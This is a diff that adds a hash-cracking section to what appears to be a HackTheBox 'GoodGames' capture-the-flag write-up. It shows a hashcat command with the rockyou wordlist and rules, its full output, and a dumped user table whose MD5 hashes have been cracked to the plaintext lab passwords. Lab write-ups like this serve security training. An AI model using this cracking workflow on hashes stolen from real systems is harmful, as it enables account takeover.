@@ -780,3 +780,89 @@ database management system users privileges:
 [*] ending @ 12:50:05 /2022-12-22/
 
 ```
+
+### Hash Cracking
+
+```
+PS D:\hashcat-6.2.6> .\hashcat -m 0 .\input\goodgames.htb.txt '.\dictionaries\*' -r ..\hashcat\rules\* -o cracked-md5-goodgames-rockyou-all_rules -O -w3 --status
+hashcat (v6.2.6-129-g18fcf28d6) starting
+
+* Device #1: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+* Device #2: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+CUDA API (CUDA 12.0)
+====================
+* Device #1: NVIDIA GeForce GTX 1070, 7231/8191 MB, 15MCU
+
+OpenCL API (OpenCL 3.0 CUDA 12.0.70) - Platform #1 [NVIDIA Corporation]
+=======================================================================
+* Device #2: NVIDIA GeForce GTX 1070, skipped
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 31
+
+Hashes: 2 digests; 2 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 77
+
+Optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Precompute-Init
+* Meet-In-The-Middle
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1473 MB
+
+Dictionary cache hit:
+* Filename..: .\dictionaries\rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 1104517568
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: .\input\goodgames.htb.txt
+Time.Started.....: Thu Dec 22 13:21:36 2022 (1 sec)
+Time.Estimated...: Thu Dec 22 13:21:37 2022 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (.\dictionaries\rockyou.txt)
+Guess.Mod........: Rules (..\hashcat\rules\best64.rule)
+Guess.Queue......: 1/95 (1.05%)
+Speed.#1.........:  1082.1 MH/s (62.14ms) @ Accel:512 Loops:77 Thr:512 Vec:1
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
+Progress.........: 605677919/1104517568 (54.84%)
+Rejected.........: 125279/605677919 (0.02%)
+Restore.Point....: 3933082/14344384 (27.42%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
+Candidate.Engine.: Device Generator
+Candidates.#1....: se7ven1985 -> gllabe
+Hardware.Mon.#1..: Temp: 35c Fan: 27% Util: 43% Core:1759MHz Mem:3802MHz Bus:16
+Started: Thu Dec 22 13:21:27 2022
+Stopped: Thu Dec 22 13:21:38 2022
+PS D:\hashcat-6.2.6>
+```
+
+**Cracked Hashes**
+```
+Database: main
+Table: user
+[2 entries]
++----+----------+---------------------+----------------------------------+--------------------+
+| id | name     | email               | password                         | password           |
++----+----------+---------------------+----------------------------------+--------------------+
+| 1  | admin    | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec | superadministrator |
+| 2  | Register | register@form.com   | 2c103f2c4ed1e59c0b4e2e01821770fa | Password123!       |
++----+----------+---------------------+----------------------------------+--------------------+
+```
+
